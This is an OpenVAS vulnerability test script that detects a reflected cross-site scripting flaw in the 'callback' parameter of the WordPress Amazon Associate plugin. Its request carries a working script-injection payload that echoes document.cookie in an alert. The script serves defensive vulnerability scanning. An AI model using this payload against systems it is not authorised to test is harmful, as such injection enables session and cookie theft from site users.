###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_amazon_associate_plugin_xss_vuln.nasl 3566 2016-06-21 07:31:36Z benallard $
#
# WordPress Amazon Associate Plugin 'callback' Parameter XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to insert arbitrary
HTML and script code, which will be executed in a user's browser session in the
context of an affected site when the malicious data is being viewed.

Impact Level: Application";

tag_affected = "WordPress Amazon Associate Plugin version 2.0 and prior";

tag_insight = "Input passed via the 'callback' parameter to
wp-content/plugins/wordpress-amazon-associate/servlet/index.php is not
properly sanitised before it is returned to the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running WordPress Amazon Associate Plugin and is
prone to cross site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803048";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3566 $");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:31:36 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2012-11-16 11:16:37 +0530 (Fri, 16 Nov 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Amazon Associate Plugin 'callback' Parameter XSS Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50971");
  script_xref(name : "URL" , value : "http://packetstorm.foofus.com/1211-advisories/sa50971.txt");

  script_summary("Check if WordPress Amazon Associate Plugin is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct XSS attack request
url = dir + '/wp-content/plugins/wordpress-amazon-associate/servlet/' +
            'index.php?callback="><script>alert(document.cookie)</script>';

## Confirm exploit worked properly or not
if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\)</script>"))
{
  security_message(port:port);
  exit(0);
}
